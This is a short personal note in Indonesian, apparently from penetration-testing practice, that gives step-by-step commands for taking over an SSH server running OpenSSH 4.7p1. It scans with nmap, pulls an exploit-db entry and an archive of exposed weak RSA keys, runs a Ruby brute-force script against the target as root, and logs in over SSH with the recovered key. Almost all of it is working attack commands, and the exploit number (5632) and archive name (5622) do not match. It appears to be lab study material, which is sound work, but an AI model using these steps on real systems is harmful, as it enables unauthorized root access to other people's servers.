---
title: Port 22 - SSH
updated: 2025-12-16 10:40:15Z
created: 2025-12-16 10:39:02Z
latitude: -6.20239360
longitude: 106.65270990
altitude: 0.0000
---

1\. Cek Kerentanan nmap -sV ip_target  
OpenSSH 4.7p1  
2\. Cari kerentanan pada versi SSH tersebut di CVE.org atau exploit-db

https://www.exploit-db.com/exploits/3303  
atau  
        https://www.exploit-db.com/exploits/5632 (digunakan v)

3\. download exploit dari situs tersebut.

4\. didalam catatan exploit tersebut terdapat key & public ssh yang telah terekspose:  
https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/5622.tar.bz2

5\. extract file bz2  
tar xjvf /home/kali/Downloads/5622.tar.bz2

cd Downloads

6\. cara menjalankan script 5632.rb  
ruby ./5632.rb ip_target root rsa/2048

7\. Uji dengan menggunakan ssh key yang sudah ditemukan. (tambahkan parameter untuk ssh metasploit versi lama)  
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa -i Downloads/rsa/2048/57c3115d77c56390332dc5c49978627a-5429 root@IP_target

ls -l /home/kali/Downloads/rsa/2048/57c3115d77c56390332dc5c49978627a-5429